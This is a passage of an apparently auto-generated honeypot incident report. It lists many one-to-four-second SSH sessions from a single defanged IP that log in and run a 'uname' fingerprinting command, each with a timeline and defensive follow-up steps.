| `2026-08-13 06:58:14` | `cowrie.log.closed` |
| `2026-08-13 06:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a1ab14aa5cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:18` | `cowrie.session.connect` |
| `2026-08-13 06:58:18` | `cowrie.client.version` |
| `2026-08-13 06:58:18` | `cowrie.client.kex` |
| `2026-08-13 06:58:19` | `cowrie.login.success` |
| `2026-08-13 06:58:19` | `cowrie.session.params` |
| `2026-08-13 06:58:19` | `cowrie.command.input` |
| `2026-08-13 06:58:20` | `cowrie.log.closed` |
| `2026-08-13 06:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6f75ede515

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:24` | `cowrie.session.connect` |
| `2026-08-13 06:58:24` | `cowrie.client.version` |
| `2026-08-13 06:58:24` | `cowrie.client.kex` |
| `2026-08-13 06:58:26` | `cowrie.login.success` |
| `2026-08-13 06:58:28` | `cowrie.session.params` |
| `2026-08-13 06:58:28` | `cowrie.command.input` |
| `2026-08-13 06:58:28` | `cowrie.log.closed` |
| `2026-08-13 06:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c72ee1526214

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:31` | `cowrie.session.connect` |
| `2026-08-13 06:58:31` | `cowrie.client.version` |
| `2026-08-13 06:58:31` | `cowrie.client.kex` |
| `2026-08-13 06:58:32` | `cowrie.login.success` |
| `2026-08-13 06:58:33` | `cowrie.session.params` |
| `2026-08-13 06:58:33` | `cowrie.command.input` |
| `2026-08-13 06:58:33` | `cowrie.log.closed` |
| `2026-08-13 06:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c14b14a004a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:37` | `cowrie.session.connect` |
| `2026-08-13 06:58:37` | `cowrie.client.version` |
| `2026-08-13 06:58:37` | `cowrie.client.kex` |
| `2026-08-13 06:58:38` | `cowrie.login.success` |
| `2026-08-13 06:58:40` | `cowrie.session.params` |
| `2026-08-13 06:58:40` | `cowrie.command.input` |
| `2026-08-13 06:58:40` | `cowrie.log.closed` |
| `2026-08-13 06:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e8ea482d733

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:43` | `cowrie.session.connect` |
| `2026-08-13 06:58:43` | `cowrie.client.version` |
| `2026-08-13 06:58:43` | `cowrie.client.kex` |
| `2026-08-13 06:58:44` | `cowrie.login.success` |
| `2026-08-13 06:58:45` | `cowrie.session.params` |
| `2026-08-13 06:58:45` | `cowrie.command.input` |
| `2026-08-13 06:58:46` | `cowrie.log.closed` |
| `2026-08-13 06:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b53f50ebc30

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:50` | `cowrie.session.connect` |
| `2026-08-13 06:58:50` | `cowrie.client.version` |
| `2026-08-13 06:58:50` | `cowrie.client.kex` |
| `2026-08-13 06:58:50` | `cowrie.login.success` |
| `2026-08-13 06:58:51` | `cowrie.session.params` |
| `2026-08-13 06:58:51` | `cowrie.command.input` |
| `2026-08-13 06:58:52` | `cowrie.log.closed` |
| `2026-08-13 06:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff560bebf69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:58 |
| **Last Seen** | 2026-08-13 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:58:56` | `cowrie.session.connect` |
| `2026-08-13 06:58:56` | `cowrie.client.version` |
| `2026-08-13 06:58:56` | `cowrie.client.kex` |
| `2026-08-13 06:58:57` | `cowrie.login.success` |
| `2026-08-13 06:58:58` | `cowrie.session.params` |
| `2026-08-13 06:58:58` | `cowrie.command.input` |
| `2026-08-13 06:58:58` | `cowrie.log.closed` |
| `2026-08-13 06:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-252a02074fc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:03` | `cowrie.session.connect` |
| `2026-08-13 06:59:03` | `cowrie.client.version` |
| `2026-08-13 06:59:03` | `cowrie.client.kex` |
| `2026-08-13 06:59:04` | `cowrie.login.success` |
| `2026-08-13 06:59:05` | `cowrie.session.params` |
| `2026-08-13 06:59:05` | `cowrie.command.input` |
| `2026-08-13 06:59:05` | `cowrie.log.closed` |
| `2026-08-13 06:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d42a99999ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:09` | `cowrie.session.connect` |
| `2026-08-13 06:59:09` | `cowrie.client.version` |
| `2026-08-13 06:59:09` | `cowrie.client.kex` |
| `2026-08-13 06:59:10` | `cowrie.login.success` |
| `2026-08-13 06:59:11` | `cowrie.session.params` |
| `2026-08-13 06:59:11` | `cowrie.command.input` |
| `2026-08-13 06:59:11` | `cowrie.log.closed` |
| `2026-08-13 06:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d8c8b05a470

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:16` | `cowrie.session.connect` |
| `2026-08-13 06:59:16` | `cowrie.client.version` |
| `2026-08-13 06:59:16` | `cowrie.client.kex` |
| `2026-08-13 06:59:17` | `cowrie.login.success` |
| `2026-08-13 06:59:18` | `cowrie.session.params` |
| `2026-08-13 06:59:18` | `cowrie.command.input` |
| `2026-08-13 06:59:18` | `cowrie.log.closed` |
| `2026-08-13 06:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ec5d754a2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:23` | `cowrie.session.connect` |
| `2026-08-13 06:59:23` | `cowrie.client.version` |
| `2026-08-13 06:59:23` | `cowrie.client.kex` |
| `2026-08-13 06:59:23` | `cowrie.login.success` |
| `2026-08-13 06:59:24` | `cowrie.session.params` |
| `2026-08-13 06:59:24` | `cowrie.command.input` |
| `2026-08-13 06:59:24` | `cowrie.log.closed` |
| `2026-08-13 06:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a900e80d4e1c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:29` | `cowrie.session.connect` |
| `2026-08-13 06:59:29` | `cowrie.client.version` |
| `2026-08-13 06:59:29` | `cowrie.client.kex` |
| `2026-08-13 06:59:30` | `cowrie.login.success` |
| `2026-08-13 06:59:31` | `cowrie.session.params` |
| `2026-08-13 06:59:31` | `cowrie.command.input` |
| `2026-08-13 06:59:31` | `cowrie.log.closed` |
| `2026-08-13 06:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e70f37ef12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:36` | `cowrie.session.connect` |
| `2026-08-13 06:59:36` | `cowrie.client.version` |
| `2026-08-13 06:59:36` | `cowrie.client.kex` |
| `2026-08-13 06:59:37` | `cowrie.login.success` |
| `2026-08-13 06:59:38` | `cowrie.session.params` |
| `2026-08-13 06:59:38` | `cowrie.command.input` |
| `2026-08-13 06:59:38` | `cowrie.log.closed` |
| `2026-08-13 06:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17df957e8f52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:42` | `cowrie.session.connect` |
| `2026-08-13 06:59:42` | `cowrie.client.version` |
| `2026-08-13 06:59:42` | `cowrie.client.kex` |
| `2026-08-13 06:59:44` | `cowrie.login.success` |
| `2026-08-13 06:59:45` | `cowrie.session.params` |
| `2026-08-13 06:59:45` | `cowrie.command.input` |
| `2026-08-13 06:59:45` | `cowrie.log.closed` |
| `2026-08-13 06:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b079cd8d723a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:49` | `cowrie.session.connect` |
| `2026-08-13 06:59:49` | `cowrie.client.version` |
| `2026-08-13 06:59:49` | `cowrie.client.kex` |
| `2026-08-13 06:59:50` | `cowrie.login.success` |
| `2026-08-13 06:59:51` | `cowrie.session.params` |
| `2026-08-13 06:59:51` | `cowrie.command.input` |
| `2026-08-13 06:59:51` | `cowrie.log.closed` |
| `2026-08-13 06:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03742d67ee90

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 06:59 |
| **Last Seen** | 2026-08-13 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 06:59:56` | `cowrie.session.connect` |
| `2026-08-13 06:59:56` | `cowrie.client.version` |
| `2026-08-13 06:59:56` | `cowrie.client.kex` |
| `2026-08-13 06:59:56` | `cowrie.login.success` |
| `2026-08-13 06:59:57` | `cowrie.session.params` |
| `2026-08-13 06:59:57` | `cowrie.command.input` |
| `2026-08-13 06:59:58` | `cowrie.log.closed` |
| `2026-08-13 06:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae03aa7bb6c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:02` | `cowrie.session.connect` |
| `2026-08-13 07:00:02` | `cowrie.client.version` |
| `2026-08-13 07:00:02` | `cowrie.client.kex` |
| `2026-08-13 07:00:03` | `cowrie.login.success` |
| `2026-08-13 07:00:04` | `cowrie.session.params` |
| `2026-08-13 07:00:04` | `cowrie.command.input` |
| `2026-08-13 07:00:04` | `cowrie.log.closed` |
| `2026-08-13 07:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f06b4670ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:08` | `cowrie.session.connect` |
| `2026-08-13 07:00:09` | `cowrie.client.version` |
| `2026-08-13 07:00:09` | `cowrie.client.kex` |
| `2026-08-13 07:00:10` | `cowrie.login.success` |
| `2026-08-13 07:00:11` | `cowrie.session.params` |
| `2026-08-13 07:00:11` | `cowrie.command.input` |
| `2026-08-13 07:00:12` | `cowrie.log.closed` |
| `2026-08-13 07:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a48dfd1240

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:15` | `cowrie.session.connect` |
| `2026-08-13 07:00:15` | `cowrie.client.version` |
| `2026-08-13 07:00:15` | `cowrie.client.kex` |
| `2026-08-13 07:00:16` | `cowrie.login.success` |
| `2026-08-13 07:00:17` | `cowrie.session.params` |
| `2026-08-13 07:00:17` | `cowrie.command.input` |
| `2026-08-13 07:00:18` | `cowrie.log.closed` |
| `2026-08-13 07:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2053245063be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:22` | `cowrie.session.connect` |
| `2026-08-13 07:00:22` | `cowrie.client.version` |
| `2026-08-13 07:00:22` | `cowrie.client.kex` |
| `2026-08-13 07:00:23` | `cowrie.login.success` |
| `2026-08-13 07:00:23` | `cowrie.session.params` |
| `2026-08-13 07:00:23` | `cowrie.command.input` |
| `2026-08-13 07:00:24` | `cowrie.log.closed` |
| `2026-08-13 07:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9458ffd84b76

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:28` | `cowrie.session.connect` |
| `2026-08-13 07:00:28` | `cowrie.client.version` |
| `2026-08-13 07:00:28` | `cowrie.client.kex` |
| `2026-08-13 07:00:29` | `cowrie.login.success` |
| `2026-08-13 07:00:31` | `cowrie.session.params` |
| `2026-08-13 07:00:31` | `cowrie.command.input` |
| `2026-08-13 07:00:31` | `cowrie.log.closed` |
| `2026-08-13 07:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bdaa11b8157

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:35` | `cowrie.session.connect` |
| `2026-08-13 07:00:35` | `cowrie.client.version` |
| `2026-08-13 07:00:35` | `cowrie.client.kex` |
| `2026-08-13 07:00:36` | `cowrie.login.success` |
| `2026-08-13 07:00:37` | `cowrie.session.params` |
| `2026-08-13 07:00:37` | `cowrie.command.input` |
| `2026-08-13 07:00:37` | `cowrie.log.closed` |
| `2026-08-13 07:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e614845620

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:42` | `cowrie.session.connect` |
| `2026-08-13 07:00:42` | `cowrie.client.version` |
| `2026-08-13 07:00:42` | `cowrie.client.kex` |
| `2026-08-13 07:00:43` | `cowrie.login.success` |
| `2026-08-13 07:00:44` | `cowrie.session.params` |
| `2026-08-13 07:00:44` | `cowrie.command.input` |
| `2026-08-13 07:00:44` | `cowrie.log.closed` |
| `2026-08-13 07:00:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b8a36f53fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:48` | `cowrie.session.connect` |
| `2026-08-13 07:00:48` | `cowrie.client.version` |
| `2026-08-13 07:00:48` | `cowrie.client.kex` |
| `2026-08-13 07:00:49` | `cowrie.login.success` |
| `2026-08-13 07:00:51` | `cowrie.session.params` |
| `2026-08-13 07:00:51` | `cowrie.command.input` |
| `2026-08-13 07:00:51` | `cowrie.log.closed` |
| `2026-08-13 07:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaac83a0d4b4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:00 |
| **Last Seen** | 2026-08-13 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:00:55` | `cowrie.session.connect` |
| `2026-08-13 07:00:55` | `cowrie.client.version` |
| `2026-08-13 07:00:55` | `cowrie.client.kex` |
| `2026-08-13 07:00:57` | `cowrie.login.success` |
| `2026-08-13 07:00:58` | `cowrie.session.params` |
| `2026-08-13 07:00:58` | `cowrie.command.input` |
| `2026-08-13 07:00:58` | `cowrie.log.closed` |
| `2026-08-13 07:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71fcb494ea2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

